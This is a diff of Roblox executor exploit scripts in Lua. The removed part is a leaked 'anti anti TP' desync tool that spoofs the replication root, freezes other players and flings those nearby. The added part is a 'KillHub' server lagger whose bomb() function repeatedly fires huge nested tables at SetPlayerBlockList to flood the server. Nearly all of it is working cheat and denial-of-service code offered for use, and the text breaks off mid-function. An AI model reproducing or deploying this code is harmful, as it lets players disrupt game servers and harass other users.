@@ -1,1086 +1,705 @@
--- [ Leaked by eclipwze at Exe Fpsl https://discord.gg/aP5WGpBZk ]
-
--- Services -------------------------------------------------------------------
-
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local NetworkClient = game:GetService("NetworkClient")
-local Workspace = game:GetService("Workspace")
-
-local LocalPlayer = Players.LocalPlayer
-local environment = if getgenv then getgenv() else _G
-local RUNTIME_KEY = "__VYNX_ANTI_ANTI_TP"
-
--- Cleanly replace an earlier copy
-local previousRuntime = environment[RUNTIME_KEY]
-if type(previousRuntime) == "table" and type(previousRuntime.destroy) == "function" then
-pcall(previousRuntime.destroy)
-end
-
-local runtime = {
-alive = true,
-enabled = false,
-awaitingKey = false,
-boundKey = Enum.KeyCode.Delete,
-character = nil,
-rootPart = nil,
-fakeRoot = nil,
-repRootOwner = nil,
-stepConnection = nil,
-connections = {},
-settingsRestore = {},
-captureGeneration = 0,
-
-antiBatConn = nil,
-freezeConn = nil,
-flingConn = nil,
-lastSafeCFrame = nil,
-lastCheckTime = 0,
-
-isMinimized = false,
-isLocked = false,
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local ConfigFile = "KillHubConfig.json"
+local NIVELES = {
+    V1 = {
+        poder = 23
+    },
+    V2 = {
+        poder = 32
+    },
+    V3 = {
+        poder = 70
+    },
+    V4 = {
+        poder = 90
+    }
 }
-
-environment[RUNTIME_KEY] = runtime
-
-local ANTI_BAT_RANGE = 5
-
--- General helpers ------------------------------------------------------------
-
-local function connect(signal, callback)
-local connection = signal:Connect(callback)
-table.insert(runtime.connections, connection)
-return connection
-end
-
-local function disconnect(connection)
-if connection then
-pcall(function()
-connection:Disconnect()
-end)
-end
-end
-
-local function create(className, properties, parent)
-local object = Instance.new(className)
-for property, value in pairs(properties or {}) do
-object[property] = value
-end
-if parent then
-object.Parent = parent
-end
-return object
-end
-
-local function corner(parent, radius)
-return create("UICorner", {
-CornerRadius = typeof(radius) == "UDim" and radius or UDim.new(0, radius),
-}, parent)
-end
-
-local function stroke(parent, color, transparency, thickness)
-return create("UIStroke", {
-ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
-Color = color,
-Transparency = transparency,
-Thickness = thickness,
-}, parent)
-end
-
-local function tween(object, duration, goals)
-local animation = TweenService:Create(
-object,
-TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
-goals
-)
-animation:Play()
-return animation
-end
-
-local function isBasePart(instance)
-if not instance then
-return false
-end
-local ok, result = pcall(function()
-return instance:IsA("BasePart")
-end)
-return ok and result == true
-end
-
-local function getCurrentRoot(character)
-character = character or LocalPlayer.Character
-if not character then
-return nil
-end
-
-local ok, root = pcall(function()
-return character:FindFirstChild("HumanoidRootPart")
-end)
-if ok and isBasePart(root) then
-return root
-end
-return nil
-end
-
--- Executor compatibility -----------------------------------------------------
-
-local function findGlobalFunction(...)
-for index = 1, select("#", ...) do
-local name = select(index, ...)
-local value = rawget(environment, name)
-if type(value) == "function" then
-return value
-end
-end
-return nil
-end
-
-local function setHidden(instance, property, value)
-if not instance then
-return false
-end
-
-local setter = findGlobalFunction(
-"sethiddenproperty",
-"set_hidden_property",
-"sethiddenprop",
-"set_hidden_prop"
-)
-if setter then
-local ok = pcall(setter, instance, property, value)
-if ok then
-return true
-end
-end
-
-return pcall(function()
-instance[property] = value
-end)
-end
-
-local function getHidden(instance, property)
-if not instance then
-return false, nil
-end
-
-local getter = findGlobalFunction(
-"gethiddenproperty",
-"get_hidden_property",
-"gethiddenprop",
-"get_hidden_prop"
-)
-if getter then
-local ok, value = pcall(getter, instance, property)
-if ok then
-return true, value
-end
-end
-
-local ok, value = pcall(function()
-return instance[property]
-end)
-return ok, value
-end
-
--- Physics/network setup ------------------------------------------------------
-
-local function rememberSetting(instance, property)
-local ok, value = pcall(function()
-return instance[property]
-end)
-if ok then
-table.insert(runtime.settingsRestore, {
-instance = instance,
-property = property,
-value = value,
-})
-end
-end
-
-local function applyPublicSetting(instance, property, value)
-if not instance then
-return false
-end
-rememberSetting(instance, property)
-return pcall(function()
-instance[property] = value
-end)
-end
-
-local function configurePhysics()
-setHidden(LocalPlayer, "MaximumSimulationRadius", math.huge)
-setHidden(LocalPlayer, "SimulationRadius", math.huge)
-
-pcall(function()
-local networkSettings = settings().Network
-applyPublicSetting(
-networkSettings,
-"InterpolationThrottling",
-Enum.InterpolationThrottlingMode.Disabled
-)
-end)
-
-pcall(function()
-local physicsSettings = settings().Physics
-applyPublicSetting(
-physicsSettings,
-"PhysicsEnvironmentalThrottle",
-Enum.EnviromentalPhysicsThrottle.Disabled
-)
-applyPublicSetting(physicsSettings, "AllowSleep", false)
-end)
-
-pcall(function()
-NetworkClient:SetOutgoingKBPSLimit(math.huge)
-end)
-end
-
-configurePhysics()
-
--- Replication-root runtime ---------------------------------------------------
-
-local FAKE_ROOT_NAME = "DavidDesyncRoot"
-local FAKE_ROOT_Y = -1000
-local FAKE_ROOT_VELOCITY = Vector3.new(0, -1000, 0)
-
-local function fakeRootIsUsable()
-local fake = runtime.fakeRoot
-if not isBasePart(fake) then
-return false
-end
-local ok, parent = pcall(function()
-return fake.Parent
-end)
-return ok and parent ~= nil
-end
-
-local function destroyFakeRoot()
-local fake = runtime.fakeRoot
-runtime.fakeRoot = nil
-if fake then
-pcall(function()
-fake:Destroy()
-end)
-end
-end
-
-local function restoreReplicationRoot()
-local owner = runtime.repRootOwner or runtime.rootPart
-if isBasePart(owner) then
-setHidden(owner, "PhysicsRepRootPart", owner)
-end
-runtime.repRootOwner = nil
-end
-
-local function createFakeRoot(rootPart)
-destroyFakeRoot()
-
-local fake = create("Part", {
-Name = FAKE_ROOT_NAME,
-Size = Vector3.new(2, 2, 1),
-Anchored = true,
-CanCollide = false,
-CanTouch = false,
-CanQuery = false,
-Transparency = 1,
-CFrame = CFrame.new(0, FAKE_ROOT_Y, 0),
-AssemblyLinearVelocity = FAKE_ROOT_VELOCITY,
-}, Workspace)
-
-local ok, position = pcall(function()
-return rootPart.Position
-end)
-if ok then
-fake.CFrame = CFrame.new(position.X, FAKE_ROOT_Y, position.Z)
-end
-
-runtime.fakeRoot = fake
-return fake
-end
-
-local function assignFakeReplicationRoot(rootPart, fake)
-if not isBasePart(rootPart) or not isBasePart(fake) then
-return false
-end
-
-setHidden(rootPart, "PhysicsRepRootPart", rootPart)
-runtime.repRootOwner = rootPart
-return setHidden(rootPart, "PhysicsRepRootPart", fake)
-end
-
-local function stepDesync()
-if not runtime.alive or not runtime.enabled then
-return
-end
-
-local root = runtime.rootPart
-if not isBasePart(root) then
-root = getCurrentRoot(runtime.character)
-runtime.rootPart = root
-end
-if not root then
-return
-end
-
-if not fakeRootIsUsable() then
-local fake = createFakeRoot(root)
-assignFakeReplicationRoot(root, fake)
-return
-end
-
-local fake = runtime.fakeRoot
-
-local ok, rootPosition, fakePosition = pcall(function()
-return root.Position, fake.Position
-end)
-if ok and (
-math.abs(rootPosition.X - fakePosition.X) > 0.01
-or math.abs(rootPosition.Z - fakePosition.Z) > 0.01
-or math.abs(fakePosition.Y - FAKE_ROOT_Y) > 0.01
-) then
-pcall(function()
-fake.CFrame = CFrame.new(rootPosition.X, FAKE_ROOT_Y, rootPosition.Z)
-end)
-end
-
-pcall(function()
-fake.Anchored = true
-fake.AssemblyLinearVelocity = FAKE_ROOT_VELOCITY
-end)
-
-local gotValue, current = getHidden(root, "PhysicsRepRootPart")
-if not gotValue or current ~= fake then
-setHidden(root, "PhysicsRepRootPart", fake)
-end
-end
-
-local function stopStepConnection()
-disconnect(runtime.stepConnection)
-runtime.stepConnection = nil
-end
-
-local function startStepConnection()
-stopStepConnection()
-runtime.stepConnection = RunService.Stepped:Connect(stepDesync)
-end
-
--- ========== ANTI-BAT / FREEZE / FLING ==========
-
-local function stopAntiBat()
-if runtime.antiBatConn then
-runtime.antiBatConn:Disconnect()
-runtime.antiBatConn = nil
-end
-runtime.lastSafeCFrame = nil
-end
-
-local function startAntiBat()
-stopAntiBat()
-runtime.lastSafeCFrame, runtime.lastCheckTime = nil, 0
-
-runtime.antiBatConn = RunService.Heartbeat:Connect(function()
-if not runtime.enabled or not runtime.alive then return end
-
-local char = LocalPlayer.Character
-if not char then return end
-local hrp = char:FindFirstChild("HumanoidRootPart")
-local hum = char:FindFirstChildOfClass("Humanoid")
-if not hrp or not hum or hum.Health <= 0 then return end
-
-local now = tick()
-
-local velocity = hrp.AssemblyLinearVelocity
-if velocity.Magnitude < 70 then
-runtime.lastSafeCFrame = hrp.CFrame
-runtime.lastCheckTime = now
-elseif velocity.Magnitude > 110 and runtime.lastSafeCFrame and (now - runtime.lastCheckTime) < 1.5 then
-hrp.CFrame = runtime.lastSafeCFrame * CFrame.new(0, 0.1, 0)
-end
-
-for _, plr in ipairs(Players:GetPlayers()) do
-if plr ~= LocalPlayer and plr.Character then
-local eHrp = plr.Character:FindFirstChild("HumanoidRootPart")
-local tool = plr.Character:FindFirstChildWhichIsA("Tool")
-if eHrp and tool and tool.Name:lower():find("bat") then
-local dist = (hrp.Position - eHrp.Position).Magnitude
-if dist < ANTI_BAT_RANGE then
-local angle = math.rad(tick() * 500)
-hrp.CFrame = hrp.CFrame * CFrame.new(math.sin(angle) * 3, 0, math.cos(angle) * 3)
-end
-end
-end
-end
-end)
-end
-
-local function stopFreeze()
-if runtime.freezeConn then
-runtime.freezeConn:Disconnect()
-runtime.freezeConn = nil
-end
-end
-
-local function startFreeze()
-stopFreeze()
-runtime.freezeConn = RunService.Heartbeat:Connect(function()
-if not runtime.enabled or not runtime.alive then return end
-for _, plr in ipairs(Players:GetPlayers()) do
-if plr ~= LocalPlayer and plr.Character then
-local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
-if hrp then
-hrp.AssemblyLinearVelocity = Vector3.zero
-hrp.AssemblyAngularVelocity = Vector3.zero
-end
-end
-end
-end)
-end
-
-local function stopFling()
-if runtime.flingConn then
-runtime.flingConn:Disconnect()
-runtime.flingConn = nil
-end
-end
-
-local function startFling()
-stopFling()
-runtime.flingConn = RunService.Heartbeat:Connect(function()
-if not runtime.enabled or not runtime.alive then return end
-local myChar = LocalPlayer.Character
-if not myChar then return end
-local myHrp = myChar:FindFirstChild("HumanoidRootPart")
-if not myHrp then return end
-
-for _, plr in ipairs(Players:GetPlayers()) do
-if plr ~= LocalPlayer and plr.Character then
-local eHrp = plr.Character:FindFirstChild("HumanoidRootPart")
-if eHrp then
-local dist = (myHrp.Position - eHrp.Position).Magnitude
-if dist < ANTI_BAT_RANGE then
-local dir = (eHrp.Position - myHrp.Position).Unit
-eHrp.AssemblyLinearVelocity = dir * 150 + Vector3.new(0, 80, 0)
-end
-end
-end
-end
-end)
-end
-
--- Character lifecycle --------------------------------------------------------
-
-local function bindCharacter(character)
-local oldRoot = runtime.rootPart
-runtime.character = character
-runtime.rootPart = getCurrentRoot(character)
-
-if runtime.enabled then
-if isBasePart(oldRoot) and oldRoot ~= runtime.rootPart then
-setHidden(oldRoot, "PhysicsRepRootPart", oldRoot)
-end
-destroyFakeRoot()
-
-local root = runtime.rootPart
-if not root and character then
-local ok, waitedRoot = pcall(function()
-return character:WaitForChild("HumanoidRootPart", 8)
-end)
-if ok and isBasePart(waitedRoot) then
-root = waitedRoot
-runtime.rootPart = root
-end
-end
-
-if root then
-local fake = createFakeRoot(root)
-assignFakeReplicationRoot(root, fake)
-startStepConnection()
-end
-
-startAntiBat()
-startFreeze()
-startFling()
-end
-end
-
-bindCharacter(LocalPlayer.Character)
-connect(LocalPlayer.CharacterAdded, function(character)
-task.defer(bindCharacter, character)
-end)
-
--- Interface palette (neutral, no purple) -------------------------------------
-
-local COLORS = {
-main = Color3.fromRGB(12, 12, 14),
-row = Color3.fromRGB(22, 22, 26),
-track = Color3.fromRGB(30, 30, 36),
-button = Color3.fromRGB(18, 18, 22),
-text = Color3.new(1, 1, 1),
-muted = Color3.fromRGB(140, 140, 150),
-accent = Color3.fromRGB(220, 220, 230),
-rowStroke = Color3.fromRGB(55, 55, 65),
+local keybind = Enum.KeyCode.M
+local listeningForInput = false
+local laggerActive = false
+local lagThread = nil
+local nivelActual = "V1"
+local ventanaBloqueada = false
+local UI_CONFIG = {
+    MainBg = Color3.fromRGB(255, 255, 255),
+    TitleColor = Color3.fromRGB(236, 72, 153),
+    TextColor = Color3.fromRGB(219, 39, 119),
+    ButtonInact = Color3.fromRGB(252, 231, 243),
+    ToggleOff = Color3.fromRGB(253, 242, 248),
+    ToggleOn = Color3.fromRGB(236, 72, 153),
+    LockColor = Color3.fromRGB(219, 39, 119),
+    UnlockColor = Color3.fromRGB(244, 114, 182),
+    Font = Enum.Font.GothamBlack,
+    BorderColor = Color3.fromRGB(252, 231, 243),
+    GlowColor = Color3.fromRGB(219, 39, 119),
+    SelectorBg = Color3.fromRGB(253, 232, 240),
+    SelectorAct = Color3.fromRGB(236, 72, 153),
+    PurpleText = Color3.fromRGB(219, 39, 119),
+    PowerColor = Color3.fromRGB(236, 72, 153)
 }
-
-local uiParent = CoreGui
-local oldGui = uiParent:FindFirstChild("VynxAntiAntiTP")
-if oldGui then
-oldGui:Destroy()
-end
-
-local screenGui = create("ScreenGui", {
-Name = "VynxAntiAntiTP",
-DisplayOrder = 999,
-ResetOnSpawn = false,
-IgnoreGuiInset = true,
-ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
-}, nil)
-
-local parented = pcall(function()
-screenGui.Parent = uiParent
-end)
-if not parented then
-local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
-or LocalPlayer:WaitForChild("PlayerGui")
-uiParent = playerGui
-local stale = uiParent:FindFirstChild("VynxAntiAntiTP")
-if stale then
-stale:Destroy()
-end
-screenGui.Parent = uiParent
-end
-runtime.gui = screenGui
-
--- Main panel -----------------------------------------------------------------
-
-local main = create("Frame", {
-Name = "Main",
-Active = true,
-ClipsDescendants = true,
-BackgroundTransparency = 0.15,
-BackgroundColor3 = COLORS.main,
-BorderSizePixel = 0,
-Position = UDim2.new(0.5, -155, 0.5, -90),
-Size = UDim2.new(0, 310, 0, 175),
-}, screenGui)
-corner(main, 16)
-
--- Background image (requested asset)
-local bgImage = create("ImageLabel", {
-Name = "Background",
-BackgroundTransparency = 1,
-Image = "rbxassetid://115695750561610",
-ScaleType = Enum.ScaleType.Crop,
-ImageTransparency = 0.35,
-Size = UDim2.new(1, 0, 1, 0),
-ZIndex = 0,
-}, main)
-corner(bgImage, 16)
-
-local mainScale = create("UIScale", {
-Scale = 1,
-}, main)
-
--- Header ---------------------------------------------------------------------
-
-local FULL_HEIGHT = 175
-local MINI_HEIGHT = 40
-
-local header = create("Frame", {
-Name = "Header",
-BackgroundTransparency = 1,
-Position = UDim2.new(0, 16, 0, 6),
-ZIndex = 10,
-Size = UDim2.new(1, -24, 0, 40),
-}, main)
-corner(header, 6)
-
-local title = create("TextLabel", {
-Name = "Title",
-BackgroundTransparency = 1,
-Text = "VYNX ANTI ANTI TP",
-TextColor3 = COLORS.text,
-Font = Enum.Font.GothamBlack,
-Position = UDim2.new(0, 4, 0, 0),
-TextXAlignment = Enum.TextXAlignment.Left,
-ZIndex = 11,
-TextSize = 14,
-Size = UDim2.new(1, -120, 1, 0),
-}, header)
-
--- Lock / Unlock button
-local lockBtn = create("TextButton", {
-Name = "LockBtn",
-AutoButtonColor = false,
-BackgroundColor3 = COLORS.button,
-BackgroundTransparency = 0.25,
-BorderSizePixel = 0,
-Position = UDim2.new(1, -92, 0.5, -12),
-Size = UDim2.new(0, 58, 0, 24),
-Text = "Lock",
-TextColor3 = COLORS.text,
-Font = Enum.Font.GothamBold,
-TextSize = 11,
-ZIndex = 12,
-}, header)
-corner(lockBtn, 6)
-
--- Minimize button (-)
-local minimizeBtn = create("TextButton", {
-Name = "MinimizeBtn",
-AutoButtonColor = false,
-BackgroundColor3 = COLORS.button,
-BackgroundTransparency = 0.25,
-BorderSizePixel = 0,
-Position = UDim2.new(1, -28, 0.5, -12),
-Size = UDim2.new(0, 24, 0, 24),
-Text = "-",
-TextColor3 = COLORS.text,
-Font = Enum.Font.GothamBlack,
-TextSize = 16,
-ZIndex = 12,
-}, header)
-corner(minimizeBtn, 6)
-
--- Content and row helper -----------------------------------------------------
-
-local content = create("Frame", {
-Name = "Content",
-BackgroundTransparency = 1,
-Position = UDim2.new(0, 18, 0, 48),
-ZIndex = 5,
-Size = UDim2.new(1, -28, 1, -54),
-}, main)
-create("UIListLayout", {
-Padding = UDim.new(0, 8),
-SortOrder = Enum.SortOrder.LayoutOrder,
-}, content)
-
-local function makeRow(name, layoutOrder)
-local row = create("Frame", {
-Name = name,
-BackgroundColor3 = COLORS.row,
-BackgroundTransparency = 0.35,
-BorderSizePixel = 0,
-Size = UDim2.new(1, 0, 0, 46),
-LayoutOrder = layoutOrder,
-ZIndex = 5,
-}, content)
-corner(row, 10)
-return row
-end
-
-local toggleRow = makeRow("AntiAntiRow", 1)
-local toggleLabel = create("TextLabel", {
-Name = "Label",
-BackgroundTransparency = 1,
-Text = "Enable Anti Anti",
-TextColor3 = COLORS.text,
-Font = Enum.Font.GothamBold,
-Position = UDim2.new(0, 14, 0, 6),
-TextXAlignment = Enum.TextXAlignment.Left,
-ZIndex = 6,
-TextSize = 13,
-Size = UDim2.new(1, -74, 0, 18),
-}, toggleRow)
-
-local statusLabel = create("TextLabel", {
-Name = "Status",
-BackgroundTransparency = 1,
-Text = "OFF",
-TextColor3 = COLORS.muted,
-Font = Enum.Font.GothamBold,
-Position = UDim2.new(0, 14, 0, 24),
-TextXAlignment = Enum.TextXAlignment.Left,
-ZIndex = 6,
-TextSize = 9,
-Size = UDim2.new(1, -74, 0, 14),
-}, toggleRow)
-
-local toggleTrack = create("Frame", {
-Name = "Toggle",
-AnchorPoint = Vector2.new(1, 0.5),
-BackgroundColor3 = COLORS.track,
-BorderSizePixel = 0,
-Position = UDim2.new(1, -12, 0.5, 0),
-ZIndex = 7,
-Size = UDim2.new(0, 44, 0, 22),
-}, toggleRow)
-corner(toggleTrack, 11)
-
-local toggleKnob = create("Frame", {
-Name = "Knob",
-BackgroundColor3 = Color3.new(1, 1, 1),
-BorderSizePixel = 0,
-Size = UDim2.new(0, 16, 0, 16),
-Position = UDim2.new(0, 3, 0, 3),
-ZIndex = 8,
-}, toggleTrack)
-corner(toggleKnob, UDim.new(1, 0))
-
-local toggleHit = create("TextButton", {
-Name = "ToggleHit",
-BackgroundTransparency = 1,
-BorderSizePixel = 0,
-Text = "",
-AutoButtonColor = false,
-ZIndex = 9,
-Size = UDim2.new(1, 0, 1, 0),
-}, toggleRow)
-
-local keybindRow = makeRow("KeybindRow", 2)
-local keybindLabel = create("TextLabel", {
-Name = "Label",
-BackgroundTransparency = 1,
-Text = "Keybind",
-TextColor3 = COLORS.text,
-Font = Enum.Font.GothamBold,
-Position = UDim2.new(0, 14, 0, 0),
-TextXAlignment = Enum.TextXAlignment.Left,
-ZIndex = 6,
-TextSize = 13,
-Size = UDim2.new(1, -84, 1, 0),
-}, keybindRow)
-
-local keybindButton = create("TextButton", {
-Name = "KeybindBtn",
-AutoButtonColor = false,
-AnchorPoint = Vector2.new(1, 0.5),
-BackgroundColor3 = COLORS.button,
-BackgroundTransparency = 0.30,
-BorderSizePixel = 0,
-Position = UDim2.new(1, -12, 0.5, 0),
-Size = UDim2.new(0, 76, 0, 26),
-Text = "Delete",
-TextColor3 = COLORS.accent,
-Font = Enum.Font.GothamBlack,
-TextSize = 11,
-ZIndex = 7,
-}, keybindRow)
-corner(keybindButton, 7)
-
-runtime.refs = {
-screenGui = screenGui,
-main = main,
-mainScale = mainScale,
-header = header,
-title = title,
-content = content,
-toggleRow = toggleRow,
-toggleLabel = toggleLabel,
-statusLabel = statusLabel,
-toggleTrack = toggleTrack,
-toggleKnob = toggleKnob,
-toggleHit = toggleHit,
-keybindRow = keybindRow,
-keybindLabel = keybindLabel,
-keybindButton = keybindButton,
+local COLOR_SCHEMES = {
+    [1] = {
+        V1 = {
+            bg = Color3.fromRGB(219, 39, 119),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V2 = {
+            bg = Color3.fromRGB(236, 72, 153),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V3 = {
+            bg = Color3.fromRGB(244, 114, 182),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V4 = {
+            bg = Color3.fromRGB(249, 168, 212),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        power = Color3.fromRGB(236, 72, 153),
+        plus = Color3.fromRGB(236, 72, 153)
+    },
+    [2] = {
+        V1 = {
+            bg = Color3.fromRGB(219, 39, 119),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V2 = {
+            bg = Color3.fromRGB(236, 72, 153),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V3 = {
+            bg = Color3.fromRGB(244, 114, 182),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        V4 = {
+            bg = Color3.fromRGB(249, 168, 212),
+            text = Color3.fromRGB(255, 255, 255)
+        },
+        power = Color3.fromRGB(236, 72, 153),
+        plus = Color3.fromRGB(236, 72, 153)
+    }
 }
-
--- Interface effects ----------------------------------------------------------
-
-local function ripple(row)
-if not runtime.alive or not row or not row.Parent then
-return
+local BG1_ID = "rbxassetid://87814827032366"
+local BG2_ID = "rbxassetid://86401501106150"
+local currentBg = 1
+local RED = Color3.fromRGB(236, 72, 153)
+local DARK_RED = Color3.fromRGB(190, 24, 93)
+local BG1_OFFSET_X = 0
+local BG1_OFFSET_Y = 0
+local function SaveConfig()
+    local data = {
+        Nivel = nivelActual,
+        Bloqueado = ventanaBloqueada,
+        Keybind = keybind.Name,
+        Bg = currentBg
+    }
+    pcall(function()
+        writefile(ConfigFile, HttpService:JSONEncode(data))
+    end)
 end
-
-local mousePosition = UserInputService:GetMouseLocation()
-local absolutePosition = row.AbsolutePosition
-local absoluteSize = row.AbsoluteSize
-local x = mousePosition.X - absolutePosition.X
-local y = mousePosition.Y - absolutePosition.Y
-local diameter = math.max(absoluteSize.X, absoluteSize.Y) * 1.35
-
-local image = create("ImageLabel", {
-Name = "Ripple",
-BackgroundTransparency = 1,
-Image = "rbxassetid://266543268",
-ImageColor3 = Color3.fromRGB(200, 200, 210),
-ImageTransparency = 0.40,
-AnchorPoint = Vector2.new(0.5, 0.5),
-Position = UDim2.new(0, x, 0, y),
-Size = UDim2.new(0, 0, 0, 0),
-ZIndex = 30,
-}, row)
-
-local animation = tween(image, 0.45, {
-Size = UDim2.new(0, diameter, 0, diameter),
-ImageTransparency = 1,
-})
-animation.Completed:Connect(function()
-if image then
-image:Destroy()
+local function LoadConfig()
+    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+        pcall(function()
+            local data = HttpService:JSONDecode(readfile(ConfigFile))
+            nivelActual = data.Nivel or "V1"
+            ventanaBloqueada = data.Bloqueado or false
+            if data.Keybind then
+                local newKey = Enum.KeyCode[data.Keybind]
+                if newKey then
+                    keybind = newKey
+                end
+            end
+            currentBg = data.Bg or 1
+            if currentBg ~= 1 and currentBg ~= 2 then
+                currentBg = 1
+            end
+        end)
+    end
 end
-end)
+LoadConfig()
+local function bomb(poder)
+    local main, spam = {}, {
+        {}
+    }
+    local z = spam[1]
+    for i = 1, 25 do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local max = math.min(12000, poder * 50)
+    for i = 1, max do
+        table.insert(main, spam)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+    end)
 end
-
-local function applyEnabledVisual(value, instant)
-statusLabel.Text = value and "ACTIVE" or "OFF"
-statusLabel.TextColor3 = value and Color3.fromRGB(120, 255, 160) or COLORS.muted
-
-local trackColor = value and Color3.fromRGB(40, 90, 55) or COLORS.track
-local knobPosition = value and UDim2.new(1, -19, 0, 3)
-or UDim2.new(0, 3, 0, 3)
-
-if instant then
-toggleTrack.BackgroundColor3 = trackColor
-toggleKnob.Position = knobPosition
-else
-tween(toggleTrack, 0.18, { BackgroundColor3 = trackColor })
-tween(toggleKnob, 0.18, { Position = knobPosition })
+local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton
+local titleLabel, textPower, keybindButton, toggleClick
+local shrinkButton, growButton, contentFrame, mainFrame, bgImage, bgToggleButton
+local function aplicarEsquema()
+    local scheme = COLOR_SCHEMES[currentBg] or COLOR_SCHEMES[2]
+    local function setButton(btn, key)
+        if nivelActual == key then
+            btn.BackgroundColor3 = scheme[key].bg
+            btn.TextColor3 = scheme[key].text
+            btn.BorderSizePixel = 0
+        else
+            btn.BackgroundColor3 = UI_CONFIG.ButtonInact
+            btn.TextColor3 = Color3.fromRGB(219, 39, 119)
+            btn.BorderSizePixel = 1
+            btn.BorderColor3 = UI_CONFIG.BorderColor
+        end
+    end
+    setButton(btnV1, "V1")
+    setButton(btnV2, "V2")
+    setButton(btnV3, "V3")
+    setButton(btnV4, "V4")
+    textPower.TextColor3 = scheme.power
+    growButton.TextColor3 = scheme.plus
 end
+local function actualizarBg()
+    if bgImage then
+        if currentBg == 1 then
+            bgImage.Image = BG1_ID
+            bgImage.Position = UDim2.new(0, BG1_OFFSET_X, 0, BG1_OFFSET_Y)
+        else
+            bgImage.Image = BG2_ID
+            bgImage.Position = UDim2.new(0, 0, 0, 0)
+        end
+    end
+    if bgToggleButton then
+        if currentBg == 1 then
+            bgToggleButton.Text = "BG1"
+            bgToggleButton.BackgroundColor3 = RED
+            bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        else
+            bgToggleButton.Text = "BG2"
+            bgToggleButton.BackgroundColor3 = DARK_RED
+            bgToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end
+    aplicarEsquema()
 end
-
--- Enable/disable -------------------------------------------------------------
-
-local function setEnabled(value)
-if not runtime.alive then
-return false
+local function actualizarSwitch()
+    if toggleContainer then
+        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+    end
+    if toggleBall then
+        toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+        if laggerActive then
+            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
+        else
+            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
+        end
+    end
+    if toggleClick then
+        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
+        if laggerActive then
+            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
+        else
+            toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
+        end
+    end
 end
-
-value = value == true
-if runtime.enabled == value then
-applyEnabledVisual(value, false)
-return value
+local function actualizarCandado()
+    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
+    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(219, 39, 119) or Color3.fromRGB(244, 114, 182)
 end
-
-runtime.enabled = value
-applyEnabledVisual(value, false)
-
-if value then
-local root = getCurrentRoot(runtime.character)
-runtime.rootPart = root
-if not root then
-runtime.enabled = false
-applyEnabledVisual(false, false)
-return false
+local function actualizarKeybindButton()
+    if keybindButton then
+        local display = keybind.Name
+        if display:match("Button") then
+            display = display:gsub("Button", "")
+        end
+        keybindButton.Text = "KEY: " .. display
+    end
 end
-
-local fake = createFakeRoot(root)
-assignFakeReplicationRoot(root, fake)
-startStepConnection()
-
-startAntiBat()
-startFreeze()
-startFling()
-else
-stopStepConnection()
-restoreReplicationRoot()
-destroyFakeRoot()
-
-stopAntiBat()
-stopFreeze()
-stopFling()
+local function toggleLagger()
+    laggerActive = not laggerActive
+    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = targetPos
+    }):Play()
+    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
+    if laggerActive then
+        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        toggleClick.TextColor3 = Color3.fromRGB(236, 72, 153)
+    end
+    if laggerActive then
+        if lagThread then
+            task.cancel(lagThread)
+        end
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function()
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
+                end)
+                bomb(NIVELES[nivelActual].poder)
+                task.wait(0.18)
+            end
+        end)
+    else
+        if lagThread then
+            task.cancel(lagThread)
+            lagThread = nil
+        end
+    end
 end
-
-return runtime.enabled
+local BASE_W = 200
+local BASE_H = 78
+local MIN_WIDTH = 150
+local MAX_WIDTH = 300
+local MIN_HEIGHT = 60
+local MAX_HEIGHT = 120
+local STEP_W = 10
+local STEP_H = 5
+local function updateLayout()
+    local currentW = mainFrame.Size.X.Offset
+    local currentH = mainFrame.Size.Y.Offset
+    local scaleX = currentW / BASE_W
+    local scaleY = currentH / BASE_H
+    local avgScale = (scaleX + scaleY) / 2
+    titleLabel.Size = UDim2.new(0, 110 * scaleX, 0, 22 * scaleY)
+    titleLabel.Position = UDim2.new(0, 8 * scaleX, 0, 0)
+    titleLabel.TextSize = 14 * avgScale
+    local keyX = 96 * scaleX
+    local lockX = (145) * scaleX
+    keybindButton.Size = UDim2.new(0, 34 * scaleX, 0, 14 * scaleY)
+    keybindButton.Position = UDim2.new(0, keyX, 0, 1 * scaleY)
+    keybindButton.TextSize = 6 * avgScale
+    lockButton.Size = UDim2.new(0, 22 * scaleX, 0, 14 * scaleY)
+    lockButton.Position = UDim2.new(0, lockX, 0, 1 * scaleY)
